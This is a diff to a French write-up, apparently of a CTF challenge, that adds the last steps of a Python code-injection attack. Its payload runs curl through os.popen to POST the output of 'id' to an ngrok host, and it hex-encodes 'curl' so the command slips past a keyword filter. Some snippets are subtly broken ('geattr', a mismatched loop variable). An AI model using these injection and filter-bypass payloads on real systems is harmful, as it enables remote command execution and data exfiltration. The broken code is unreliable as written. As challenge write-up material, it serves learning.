@@ -42,8 +42,16 @@ echo file_get_contents("data.txt");
 J'héberge le fichier ``PHP`` dans le dossier ``tmp``. Comme tunnel j'utilise ``ngrok``: ``ngrok http 80``.
 J'ai maintenant mon lien, que je peux exploiter pour recept les données.
 Je reviens à la base, mais cette fois-ci en utilisant ``curl`` pour renvoyer une requête POST: ``);geattr(__builtins__,'__imp''ort__')('o''s').popen('curl\x20-X\x20POST\x20-d\x20\x22data=$(id)\x22\x20https://rand.ngrok.io/tmp')#``.
-J'obtiens ``Blocked``, le filtre a donc trigger une partie de la commande. Ayant la flemme de chercher une alternative (``wget triggered``). Je teste plusieurs techniques de bypass: ``'CURL'.lower()`` => ``Blocked``. Je tente une méthode de chiffrement pour déchiffrer dynamiquement et exécuter curl.
+J'obtiens ``Blocked``, le filtre a donc trigger une partie de la commande. Ayant la flemme de chercher une alternative (``wget triggered``). Je teste plusieurs techniques de bypass: ``'CURL'.lower()`` => ``Blocked``. Je tente une méthode de chiffrement pour déchiffrer dynamiquement et exécuter ``curl``.
 ```py
 >>> ''.join([str(hex(ord(s)))[2:4] for s in 'curl'])
 '6375726c'
+>> ''.join([chr(int(''.join(c),16)) for s in zip('6375726c'[0::2],'6375726c'[1::2])])
+'curl'
 ```
+Vous avez dû remarquer, j'ai réécrit la fonction ``hex()`` pour éviter une autre fois le filtre. Comme requête finale j'obtiens:
+``);geattr(__builtins__,'__imp''ort__')('o''s').popen(''.join([chr(int(''.join(c),16)) for s in zip('6375726c'[0::2],'6375726c'[1::2])])+'\x20-X\x20POST\x20-d\x20\x22data=$(id)\x22\x20https://rand.ngrok.io/tmp')#``.
+Le serveur me renvoit bien la réponse:
+![image](https://user-images.githubusercontent.com/74382279/157323588-d2b559b5-7894-43c3-8a14-2c9bd8b79e00.png)
+
+
